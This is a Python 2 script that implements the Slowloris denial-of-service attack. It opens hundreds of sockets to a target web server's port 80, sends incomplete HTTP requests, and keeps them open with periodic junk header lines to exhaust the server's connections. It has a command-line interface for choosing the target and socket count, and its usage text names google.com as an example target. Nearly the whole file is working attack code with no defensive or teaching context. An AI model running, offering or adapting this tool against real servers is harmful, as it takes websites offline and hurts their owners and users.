#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import socket
import argparse
import atexit
import signal
import datetime
# import requests

headers = ['User-Agent: Mozilla/5.0 (X11; U; Linux i686; ru; rv:1.9b5) Gecko/2008050509 Firefox/3.0b5',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
'Accept-Language: ru,en-us;q=0.7,en;q=0.3',
'Accept-Charset: windows-1251,utf-8;q=0.7,*;q=0.7',
'Connection: keep-alive']
sokets = []
soketCount = 300
URL = ''
line = '-' * 69

def clearScreen():
	os.system('cls' if os.name == 'nt' else 'clear')

def parseArgs():
	global soketCount, URL
	parser = argparse.ArgumentParser()
	parser.add_argument('-u',action='store')
	parser.add_argument('-s',action='store')
	arg = parser.parse_args()

	if arg.s:
		soketCount = int(arg.s)

	if arg.u:
		URL = arg.u
	else:
		sys.exit(-1)

def createSocket():
	res = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	res.settimeout(5)
	res.connect((URL, 80))

	res.send('GET /? %d HTTP/1.1\r\n' % random.randint(0, 99999))
	for h in headers:
		res.send('%s\r\n'%(h))

	return res

def run():
	print '\n\t\tSlowLoris implementation by @maxkrivich\n'
	print line
	print '[*] Target IP:\t\t%s\n[*] Target Hostname:\t%s\n[*] Target Port:\t%s\n[*] Start Time:\t\t%s\n[*] Socket Count:\t%d' % \
			(socket.gethostbyname(URL), URL,'80', datetime.datetime.now().strftime("%Y-%m-%d %H:%M"),soketCount)
	print line
	cnt = 0
	while soketCount - cnt > 0:
		try:
			i = createSocket()
			cnt += 1
		except:
			continue
		sys.stdout.write('\r[*] Socket Created: %d' % cnt)
		sys.stdout.flush()
		sokets.append(i)

	sys.stdout.write('\r[+] Socket Created: %d\n' % cnt)

	sends = 0
	die = 0

	while True:
		for sk in sokets:
			try:
				sends += 1
				sk.send('X-a: %d\r\n' % random.randint(0, 99999))
			except:
				sokets.remove(sk)
				die += 1
				cnt -= 1
		sys.stdout.write('\r\t\tsend: %d\t die: %d \t alive: %d' % (sends, die, cnt))
		sys.stdout.flush()

		while soketCount - len(sokets):
			s = createSocket()
			cnt += 1
			sokets.append(s)
			sys.stdout.write('\r\t\tsend: %d\t die: %d\t alive: %d' % (sends, die, cnt))
			sys.stdout.flush()

		time.sleep(3)

def ex(signal, frame):
	print '\r'
	print line
	sys.exit(0)

def main():
	clearScreen()
	if len(sys.argv) < 2:
		print '\nUsage: \n -u \t google.com [str]\n -s \t socket count [int]\n\n'
		sys.exit(-1)
	else:
		signal.signal(signal.SIGINT, ex)
		parseArgs()

	run()

if __name__ == '__main__':
	main()